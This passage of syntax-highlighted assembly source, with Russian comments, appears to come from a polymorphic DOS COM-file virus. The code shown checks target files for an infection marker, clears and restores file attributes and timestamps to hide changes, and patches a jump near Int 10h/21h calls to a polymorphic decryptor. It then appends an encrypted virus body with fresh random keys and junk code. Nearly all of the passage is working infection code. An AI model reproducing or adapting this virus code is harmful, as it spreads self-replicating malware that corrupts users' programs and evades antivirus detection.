       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
       </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">ExitTest</span><span class="sc0"> </span><span class="sc1">;Слишком мал</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
       </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">ExitTest</span><span class="sc0"> </span><span class="sc1">;Слишком велик</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFAttr</span><span class="sc0"> </span><span class="sc1">;Очищаем атрибуты файла</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitTest</span><span class="sc0"> </span><span class="sc1">;Не можем изменить атрибуты</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Открываем файл на чтение/запись</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitTest</span><span class="sc0"> </span><span class="sc1">;Открыть не можем</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;Сохраняем Handle</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Reserv</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Читаем первых три байта файла - это ключ для расшифровки метки</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0"> </span><span class="sc1">;Прочитать не можем</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Reserv</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0"> </span><span class="sc1">;Это EXE-программа с COM-расширением</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_NEW</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GoToBegin</span><span class="sc0"> </span><span class="sc1">;Уходим за три байта от конца файла</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0"> </span><span class="sc1">;Ну уж я не знаю, почему не смогли</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">OLD_BYTES</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Читаем последнии три байта файла - это может быть нашей меткой</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0"> </span><span class="sc1">;Это наверное чтобы CrkV к нам не приставал ;)</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">OLD_BYTES</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Reserv</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'+V'</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0"> </span><span class="sc1">;Уже инфецирован</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc1">;Вот как раз то, что мы искали</span><span class="sc0">
</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_NEW</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_NEW</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Восстановим дату/время файла</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitTest</span><span class="sc0"> </span><span class="sc1">;Не смогли :(</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Закроем файл</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitTest</span><span class="sc0"> </span><span class="sc1">;Опять не смогли :(</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_NEW</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFAttr</span><span class="sc0"> </span><span class="sc1">;Восстановим атрибуты файла</span><span class="sc0">
</span><span class="sc5">ExitTest</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc1">;Ищем следующий</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Инфецирование найденного файла</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GoToBegin</span><span class="sc0"> </span><span class="sc1">;Уходим в начало файла</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Читаем первый килобайт файла в буфер</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindSpace</span><span class="sc0"> </span><span class="sc1">;Ищем место для внедрения</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">InfectToSpace</span><span class="sc0">  </span><span class="sc1">;Нашли тепленькое местечко</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Бум писать переход в начало файла</span><span class="sc0">
</span><span class="sc5">InfectToSpace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">OLD_BYTES</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">movsw</span><span class="sc0">
       </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;Сохраняем байты программы, которые заменим своими</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectedInToSpace</span><span class="sc0"> </span><span class="sc1">;Инфецирование</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">FindSpace</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Поиск Int 10h / Int 21h в первом килобайте файла</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">MInt10h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">concatenat_string_in_memory</span><span class="sc0"> </span><span class="sc1">;Ищем Int 10h</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">OkFindSpace</span><span class="sc0"> </span><span class="sc1">;Нашли, однако ;)</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">MInt21h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">concatenat_string_in_memory</span><span class="sc0"> </span><span class="sc1">;Ищем Int 21h</span><span class="sc0">
</span><span class="sc5">OkFindSpace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">InfectedInToSpace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GoToBegin</span><span class="sc0"> </span><span class="sc1">;Уходим на найденное место в файле</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_NEW</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;Калькулируем адрес перехода на начало полидекриптора</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Reserv</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;Калькулируем команду перехода</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">JMP_OFS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;Сохраняем смещение в памяти команды</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Записываем команду перехода на полидекриптор</span><span class="sc0">
</span><span class="sc5">CalcNewVirus</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Будем делать новую тушку вируса</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ZerroBuffer</span><span class="sc0"> </span><span class="sc1">;Очищаем буфер для хранения смещений блоков</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Musor</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CalcPoly</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GoToEnd</span><span class="sc0"> </span><span class="sc1">;Уходим в конец файла</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Записываем полидекриптор</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">DTA_NEW</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc5">IndexBuff</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">;В регистре AX смещение точки входа в полидекриптор</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">JMP_OFS</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Смещение команды JMP Virus</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;Новый адрес перехода на точку входа в полидекриптор</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">VirLength</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">;Адрес перехода в файле</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GoToBegin</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">VirLength</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Записываем адрес точки входа в полидекриптор</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GoToEnd</span><span class="sc0"> </span><span class="sc1">;Уходим в конец файла</span><span class="sc0">
</span><span class="sc1">;Калькулируем новый ключ для статического декриптора</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_Calc_Rnd16</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">TabelleKeys</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">KeyStat</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Записываем в буфер тушку</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLength</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc1">;Шифруем тушку статическим декриптором</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">+</span><span class="sc5">CryptStart</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">CryptLength</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">@EP_Start1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@EP_Start1</span><span class="sc0">
</span><span class="sc1">;Шифруем буфер ключами от полидекриптора</span><span class="sc0">
</span><span class="sc1">;- Вычисляем ключ</span><span class="sc0">
</span><span class="sc5">PPoly0</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">TabelleKeys</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">PPoly1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLength</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">PPoly2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">TabelleKeys</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">PPoly2</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">PPoly3</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
